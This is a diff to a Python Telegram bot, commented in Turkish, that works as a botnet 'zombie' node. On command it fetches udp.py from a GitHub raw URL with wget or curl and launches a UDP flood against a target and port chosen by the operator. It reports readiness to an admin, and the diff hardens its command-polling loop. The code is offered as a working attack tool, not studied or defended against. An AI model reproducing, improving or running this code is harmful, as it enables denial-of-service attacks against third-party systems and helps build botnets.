@@ -8,9 +8,8 @@ def install_requirements():
     try:
         import telebot
     except ImportError:
-        # Sunucuda pip yoksa diye önlem
         os.system(f"{sys.executable} -m pip install pyTelegramBotAPI")
-        time.sleep(2)
+        time.sleep(3)
         import telebot
 
 install_requirements()
@@ -34,11 +33,11 @@ def attack(message):
                 
             target, port, threads, duration = args[1], args[2], args[3], args[4]
             
-            # udp.py yoksa GitHub'dan çek, sonra vuruşu başlat
+            # udp.py yoksa GitHub'dan çek ve saldırıyı başlat
             cmd = f"wget -q -O udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py || curl -s -L -o udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py; python3 udp.py {target} {port} {threads} {duration}"
             
             subprocess.Popen(cmd, shell=True)
-            bot.reply_to(message, f"🚀 Mermiler yağdırılıyor... \n🎯 Hedef: {target}:{port}\n⏰ Süre: {duration}sn")
+            bot.reply_to(message, f"🚀 Mermiler yağdırılıyor! \n🎯 Hedef: {target}:{port}\n⏰ Süre: {duration}sn")
             
         except Exception as e:
             bot.reply_to(message, f"❌ Hata: {str(e)}")
@@ -53,10 +52,17 @@ def stop_attack(message):
         except:
             pass
 
-# Bot ilk açıldığında komutana sinyal çakar
+# İlk açılış mesajı
 try:
     bot.send_message(ADMIN_ID, "🧟 Zombi hazır usta! Emirlerini bekliyorum.")
 except:
     pass
 
-bot.infinity_polling()
+# --- CONFLICT (409) HATASINI ÖNLEYEN DÖNGÜ ---
+while True:
+    try:
+        # interval=5 yaparak zombilerin Telegram'ı sıkıştırmasını engelledik
+        bot.polling(non_stop=True, interval=5, timeout=30)
+    except Exception as e:
+        # Hata olursa 5 saniye bekle ve tekrar dene
+        time.sleep(5)
